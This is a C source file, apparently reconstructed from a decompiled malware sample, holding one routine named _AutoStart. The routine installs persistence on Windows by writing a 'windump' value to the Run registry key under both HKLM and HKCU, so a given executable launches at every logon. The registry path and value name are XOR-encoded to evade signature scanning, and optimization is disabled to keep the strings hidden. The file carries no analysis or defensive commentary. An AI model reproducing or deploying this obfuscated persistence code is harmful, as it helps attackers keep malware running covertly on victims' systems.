#include "data_globals.h"
#include <windows.h>
#include <stdint.h>
#include <string.h>

#pragma optimize("", off)
static void xor_decrypt(volatile char *buf, size_t len, unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        buf[i] ^= key;
    }
}

void _AutoStart(BYTE *param_1)
{
    LSTATUS LVar1;
    DWORD DVar2;
    HKEY local_10[3];

    // "Software\\Microsoft\\Windows\\CurrentVersion\\Run" XOR'd with key 0x3E
    volatile char sz_reg_path[] = {
        'S'^0x3E, 'o'^0x3E, 'f'^0x3E, 't'^0x3E, 'w'^0x3E, 'a'^0x3E, 'r'^0x3E, 'e'^0x3E,
        '\\'^0x3E, 'M'^0x3E, 'i'^0x3E, 'c'^0x3E, 'r'^0x3E, 'o'^0x3E, 's'^0x3E, 'o'^0x3E,
        'f'^0x3E, 't'^0x3E, '\\'^0x3E, 'W'^0x3E, 'i'^0x3E, 'n'^0x3E, 'd'^0x3E, 'o'^0x3E,
        'w'^0x3E, 's'^0x3E, '\\'^0x3E, 'C'^0x3E, 'u'^0x3E, 'r'^0x3E, 'r'^0x3E, 'e'^0x3E,
        'n'^0x3E, 't'^0x3E, 'V'^0x3E, 'e'^0x3E, 'r'^0x3E, 's'^0x3E, 'i'^0x3E, 'o'^0x3E,
        'n'^0x3E, '\\'^0x3E, 'R'^0x3E, 'u'^0x3E, 'n'^0x3E, 0x00^0x3E
    };
    xor_decrypt(sz_reg_path, sizeof(sz_reg_path), 0x3E);

    // "windump" XOR'd with key 0x7A
    volatile char sz_value_name[] = {
        'w'^0x7A, 'i'^0x7A, 'n'^0x7A, 'd'^0x7A, 'u'^0x7A, 'm'^0x7A, 'p'^0x7A, 0x00^0x7A
    };
    xor_decrypt(sz_value_name, sizeof(sz_value_name), 0x7A);

    LVar1 = RegOpenKeyExA((HKEY)0x80000002, (char*)sz_reg_path, 0,
                          0x20006, local_10);
    if (LVar1 == 0) {
        DVar2 = strlen((char *)param_1);
        RegSetValueExA(local_10[0], (char*)sz_value_name, 0, REG_SZ, param_1, DVar2);
        RegCloseKey(local_10[0]);
    }
    LVar1 = RegOpenKeyExA((HKEY)0x80000001, (char*)sz_reg_path, 0,
                          0x20006, local_10);
    if (LVar1 == 0) {
        DVar2 = strlen((char *)param_1);
        RegSetValueExA(local_10[0], (char*)sz_value_name, 0, REG_SZ, param_1, DVar2);
        RegCloseKey(local_10[0]);
    }
}
#pragma optimize("", on)
